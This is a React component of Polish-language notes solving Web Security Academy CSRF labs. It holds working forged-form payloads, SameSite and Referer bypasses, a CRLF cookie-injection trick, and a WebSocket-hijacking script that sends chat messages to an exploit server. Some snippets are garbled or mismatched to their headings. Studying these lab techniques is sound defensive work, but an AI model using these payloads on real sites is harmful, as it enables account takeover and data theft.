const CSRF = () =>{
    return(
        <details>
            <summary>Cross-site request forgery (CSRF)</summary>

            <details>
              <summary>CSRF bez obrony</summary>
              <div className="waring">
                <p className="result">Rozwiązanie: </p>
                <p>{`<html>`}</p>
                <p className="tab-1">{`<body>`}</p>
                <p className="tab-2">{`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">`}</p>
                <p className="tab-3">{`<input type="hidden" name="email" value="anything@web-security-academy.net">`}</p>
                <p className="tab-2">{`<script>`}</p>
                <p className="tab-3">{`document.forms[0].submit();`}</p>
                <p className="tab-2">{`</script>`}</p>
                <p className="tab-1">{`</body>`}</p>
                <p>{`</html>`}</p>
              </div>
           </details>

            <details>
              <summary>CSRF, w zależności od metody</summary>
              <div className="waring">
                <p>Przy normalnej zmianie maila mamy metodę POST, jednak możmy zastosować rónież metodę GET</p>
                <p className="result">Rozwiązanie: </p>
                <p>{`<html>`}</p>
                <p className="tab-1">{`<body>`}</p>
                <p className="tab-2">{`<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">`}</p>
                <p className="tab-3">{`<input type="hidden" name="email" value="anything@web-security-academy.net">`}</p>
                <p className="tab-2">{`<script>`}</p>
                <p className="tab-3">{`document.forms[0].submit();`}</p>
                <p className="tab-2">{`</script>`}</p>
                <p className="tab-1">{`</body>`}</p>
                <p>{`</html>`}</p>
              </div>
           </details>

            <details>
              <summary>CSRF, w którym walidacja zależy od tokena</summary>
              <div className="waring">
                <p>W formularzu znajduję się ukryte pole <span className="important">csrf</span> które dodawane jest w request</p>
                <p className="result">Rozwiązanie: </p>
                <p>{`<html>`}</p>
                <p className="tab-1">{`<body>`}</p>
                <p className="tab-2">{`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">`}</p>
                <p className="tab-3">{`<input type="hidden" name="email" value="anything@web-security-academy.net">`}</p>
                <p className="tab-2">{`<script>`}</p>
                <p className="tab-3">{`document.forms[0].submit();`}</p>
                <p className="tab-2">{`</script>`}</p>
                <p className="tab-1">{`</body>`}</p>
                <p>{`</html>`}</p>
                <br />
                <p>Pole <span className="important">csrf</span> nie jest obowiązkowe</p>
              </div>
           </details>

            <details>
              <summary>CSRF, w którym token nie jest powiązany z sesją użytkownika</summary>
              <div className="waring">
                <p>W formularzu znajduję się ukryte pole <span className="important">csrf</span> które dodawane jest w request</p>
                <p className="result">Rozwiązanie: </p>
                <p>{`<html>`}</p>
                <p className="tab-1">{`<body>`}</p>
                <p className="tab-2">{`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">`}</p>
                <p className="tab-3">{`<input type="hidden" name="email" value="anything@web-security-academy.net">`}</p>
                <p className="tab-3">{`<input type="hidden" name="csrf" value="<CSRF>`}</p>
                <p className="tab-2">{`<script>`}</p>
                <p className="tab-3">{`document.forms[0].submit();`}</p>
                <p className="tab-2">{`</script>`}</p>
                <p className="tab-1">{`</body>`}</p>
                <p>{`</html>`}</p>
                <br />
                <p>WARTOŚĆ CSRF NIE POWINNA BYĆ WCZEŚNIEJ WYKORZYSTANA</p>
                <p>Wartość pola <span className="important">csrf</span> jest przypadkowo generowana, <u>można wykorzytać z naszego usera do innego usera</u></p>
              </div>
           </details>

            <details>
              <summary>CSRF, w którym token jest powiązany z plikiem cookie innym niż sesyjny</summary>
              <div className="waring">
                <p>W formularzu znajduję się ukryte pole <span className="important">csrf</span> które dodawane jest w request</p>
                <p className="result">Rozwiązanie: </p>
                <p>{`<html>`}</p>
                <p className="tab-1">{`<body>`}</p>
                <p className="tab-2">{`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">`}</p>
                <p className="tab-3">{`<input type="hidden" name="email" value="anything@web-security-academy.net">`}</p>
                <p className="tab-3">{`<input type="hidden" name="csrf" value="<CSRF>`}</p>
                <p className="tab-2">{`</form>`}</p>
                <p className="tab-2">{`<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=<NASZ KLUCZ>%3b%20SameSite=None" onerror="document.forms[0].submit()">`}</p>
                <p className="tab-1">{`</body>`}</p>
                <p>{`</html>`}</p>
                <br />
                <p>Należy użyć naszego <span className="important">csrfKey</span> z cookie oraz naszego <span className="important">csrf</span></p>
              </div>
           </details>

            <details>
              <summary>CSRF, w którym token jest duplikowany w pliku cookie</summary>
              <div className="waring">
                <p>W formularzu znajduję się ukryte pole <span className="important">csrf</span> które dodawane jest w request</p>
                <p className="result">Rozwiązanie: </p>
                <p>{`<html>`}</p>
                <p className="tab-1">{`<body>`}</p>
                <p className="tab-2">{`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">`}</p>
                <p className="tab-3">{`<input type="hidden" name="email" value="anything@web-security-academy.net">`}</p>
                <p className="tab-3">{`<input type="hidden" name="csrf" value="<TEN SAM KLUCZ>`}</p>
                <p className="tab-2">{`</form>`}</p>
                <p className="tab-2">{`<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=<TEN SAM KLUCZ>%3b%20SameSite=None" onerror="document.forms[0].submit()">`}</p>
                <p className="tab-1">{`</body>`}</p>
                <p>{`</html>`}</p>
                <br />
                <p>Należy użyć takiego samego <span className="important">csrf</span> z cookie dla <span className="important">csrf</span></p>
              </div>
           </details>

            <details>
              <summary>CSRF, SameSite Lax ominięcie poprzez nadpisanie metody</summary>
              <div className="waring">
                <p className="result">Rozwiązanie: </p>
                <p>{`<script>`}</p>         
                <p className="tab-1">{`document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";`}</p>  
                <p>{`</script>`}</p>
                <br />
                <p>Mamy metodę GET poprzez document.location, jednak nadpisujemy ją poprzez <span className="important">_method=POST</span></p>
              </div>
           </details>

            <details>
              <summary>CSRF, SameSite Strict bypass poprzez przekierowanie po stronie klienta</summary>
              <div className="waring">
                <p className="result">Rozwiązanie: </p>
                <p>{`<script>`}</p>         
                <p className="tab-1">{`document.location = "document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";`}</p>  
                <p>{`</script>`}</p>
              </div>
           </details>

            <details>
              <summary>CSRF, SameSite Strict bypass przez subdomenę</summary>
              <p>W responsie dla /resources/js/chat.js możemy zauważyć sub domenę https://cms.YOUR-LAB-ID.web-security-academy.net</p>
              <p>Po wejściu na stronę i sprawdzenie inputów możemy zauważyć że w polu login jest możliwość XSS</p>
              <p>{`<script>
                    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
                    ws.onopen = function() {
                        ws.send("READY");
                    };
                    ws.onmessage = function(event) {
                        var messages= event.data;
                        fetch('https://<EXPLOIT>-YOUR-LAB-ID.web-security-academy.net/exploit?message='+btoa(messages));
                    };
                </script>`}
              </p>
              <div className="waring">
                <p className="result">Rozwiązanie: </p>
                <p>{`<script>`}</p>         
                <p className="tab-1">{`document.location = "https://cms.YOUR-LAB-ID.web-security-academy.net/login?username=<YOUR-URL-ENCODED-CSWSH-SCRIPT>&password=anything";`}</p>  
                <p>{`</script>`}</p>
              </div>
           </details>
           
            <details>
              <summary>CSRF, SameSite Lax ominiesz poprzez odświeżenie pliku cookie</summary>
              <div className="waring">
                <p>W formularzu znajduję się ukryte pole <span className="important">csrf</span> które dodawane jest w request</p>
                <p className="result">Rozwiązanie: </p>
                <p>{`<html>`}</p>
                <p className="tab-1">{`<body>`}</p>
                <p className="tab-2">{`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">`}</p>
                <p className="tab-3">{`<input type="hidden" name="email" value="anything@web-security-academy.net">`}</p>
                <p className="tab-2">{`</form>`}</p>
                <p className="tab-2">{`<p>Click anywhere on the page</p>`}</p>
                <p className="tab-2">{`<script>`}</p>
                <p className="tab-3">{`window.onclick = () => {`}</p>
                <p className="tab-4">{`window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');`}</p>
                <p className="tab-4">{`setTimeout(changeEmail, 5000);`}</p>
                <p className="tab-3">{`}`}</p>
                <p className="tab-3">{`function changeEmail() {`}</p>
                <p className="tab-4">{`document.forms[0].submit();`}</p>
                <p className="tab-3">{`}`}</p>
                <p className="tab-2">{`</script>`}</p>
                <p className="tab-1">{`</body>`}</p>
                <p>{`</html>`}</p>
              </div>
              <br />
              <p>Wymaga zmuszenie usera do kliknięcia na window, by wywołać fukcję dla odświeżenia cookie, a następnie wymusić zmianę maila</p>
           </details>
           
            <details>
              <summary>CSRF, gdzie walidacja Referer zależy od obecności nagłówka</summary>
              <div className="waring">
                <p>W formularzu znajduję się ukryte pole <span className="important">csrf</span> które dodawane jest w request</p>
                <p className="result">Rozwiązanie: </p>
                <p>{`<html>`}</p>
                <p className="tab-1">{`<body>`}</p>
                <p className="tab-2">{`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">`}</p>
                <p className="tab-3">{`<input type="hidden" name="email" value="anything@web-security-academy.net">`}</p>
                <p className="tab-2">{`</form>`}</p>
                <p className="tab-2">{`<p>Click anywhere on the page</p>`}</p>
                <p className="tab-2">{`<script>`}</p>
                <p className="tab-3">{`window.onclick = () => {`}</p>
                <p className="tab-4">{`window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');`}</p>
                <p className="tab-4">{`setTimeout(changeEmail, 5000);`}</p>
                <p className="tab-3">{`}`}</p>
                <p className="tab-3">{`function changeEmail() {`}</p>
                <p className="tab-4">{`document.forms[0].submit();`}</p>
                <p className="tab-3">{`}`}</p>
                <p className="tab-2">{`</script>`}</p>
                <p className="tab-1">{`</body>`}</p>
                <p>{`</html>`}</p>
              </div>
              <br />
              <p>Wymaga zmuszenie usera do kliknięcia na window, by wywołać fukcję dla odświeżenia cookie, a następnie wymusić zmianę maila</p>
           </details>
           
            <details>
              <summary>CSRF z uszkodzoną walidacją Referer</summary>
              <p>Przy wysyłaniu CSRF występuje błąd "Invalid referer header", musimy zmodyfikować CSRF</p>
              <div className="waring">
                <p className="result">Rozwiązanie: </p>
                <p>{`<html>`}</p>
                <p className="tab-1">{`<body>`}</p>
                <p className="tab-2">{`<script>history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")</script>`}</p>
                <p className="tab-2">{`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">`}</p>
                <p className="tab-3">{`<input type="hidden" name="email" value="anything@web-security-academy.net">`}</p>
                <p className="tab-2">{`<script>`}</p>
                <p className="tab-3">{`document.forms[0].submit();`}</p>
                <p className="tab-2">{`</script>`}</p>
                <p className="tab-1">{`</body>`}</p>
                <p>{`</html>`}</p>
              </div>
           </details>
        </details>
    )
}

export default CSRF;